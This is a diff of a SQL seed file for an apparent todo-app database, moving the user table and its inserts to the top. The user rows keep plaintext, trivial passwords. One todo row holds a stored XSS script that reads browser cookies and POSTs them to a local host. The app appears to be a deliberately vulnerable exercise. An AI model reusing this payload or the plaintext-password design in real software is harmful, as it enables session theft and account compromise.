@@ -1,3 +1,25 @@
+DROP TABLE IF EXISTS `user`;
+
+CREATE TABLE `user` (
+  `id` int NOT NULL AUTO_INCREMENT,
+  `username` varchar(80) NOT NULL,
+  `password` varchar(80) NOT NULL,
+  `email` varchar(255) DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  UNIQUE KEY `username` (`username`),
+  UNIQUE KEY `email` (`email`)
+);
+
+INSERT INTO `user` (username, password, email) VALUES 
+('admin','admin','admin@admin.com'),
+('test','test',NULL),
+('aabc','1234','test@123.de'),
+('hallo123','uDjHwxooHcyaGwUNKM','test@schuttenberg.net'),
+('public','',''),
+('test123','test123','test@test.com');
+
+
+
 DROP TABLE IF EXISTS `project`;
 
 CREATE TABLE `project` (
@@ -45,22 +67,3 @@ INSERT INTO `todo` (description, due_date, project_id, author) VALUES
 ('lol',NULL,3,NULL),
 ('<script>cookies=document.cookie;fetch(`http://127.0.0.1:8000`, {method: `POST`, mode: `no-cors`, headers: {\"Content-Type\": `application/json`},body: JSON.stringify({cookies: cookies})}).then(data => console.log(`Data sent`)).catch(error => console.error(`Error:`,error));</script>',NULL,99,NULL);
 
-DROP TABLE IF EXISTS `user`;
-
-CREATE TABLE `user` (
-  `id` int NOT NULL AUTO_INCREMENT,
-  `username` varchar(80) NOT NULL,
-  `password` varchar(80) NOT NULL,
-  `email` varchar(255) DEFAULT NULL,
-  PRIMARY KEY (`id`),
-  UNIQUE KEY `username` (`username`),
-  UNIQUE KEY `email` (`email`)
-);
-
-INSERT INTO `user` (username, password, email) VALUES 
-('admin','admin','admin@admin.com'),
-('test','test',NULL),
-('aabc','1234','test@123.de'),
-('hallo123','uDjHwxooHcyaGwUNKM','test@schuttenberg.net'),
-('public','',''),
-('test123','test123','test@test.com');
